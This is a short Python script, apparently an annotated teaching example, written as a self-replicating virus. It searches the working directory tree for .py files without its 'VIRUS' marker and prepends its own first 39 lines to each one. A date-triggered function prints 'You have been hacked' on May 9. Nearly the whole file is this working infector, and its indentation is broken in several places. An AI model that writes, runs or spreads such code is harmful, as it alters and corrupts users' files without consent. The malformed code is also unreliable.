#!/usr/bin/python3
# Importing operating system
import os
# Importing date and time
import datetime

# Signature variable is set to "virus"
SIGNATURE = "VIRUS"
# Function is defined
def locate(path):
    files_targeted = []
    # Variable file list is defined os.listdir(path)
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        # Setting conditions to identify .py files within targeted
            elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
            # Determining if signature "virus" is identified in line and if not (false) then it will be appended to file_targeted list    
            if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
# Defining virus variable to open(os.path.abspath(_file_))  
virus = open(os.path.abspath(__file__))
# It prepares viruststring to extract the first 39 lines in script file  
virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
# The files in files_targeted are opened, read, and the written over with virusstring then closing it
    for fname in files_targeted:
            f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

# defining the detonate function
def detonate():
# the function checks current date and if it comes to May 9th then it will print "you have been hacked"    
if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# The script then calls the locate function with an empty string as the path argument, it will search for Python files in the current working directory and its subdirectories. 
# It stores the returned list of targeted files in the files_targeted variable.        
files_targeted = locate(os.path.abspath(""))
# Infect function called the "files_targed" list as the argument which infects the targeted files
infect(files_targeted)
# This detonate function checks current date and matched detonation for May 9th. 
detonate()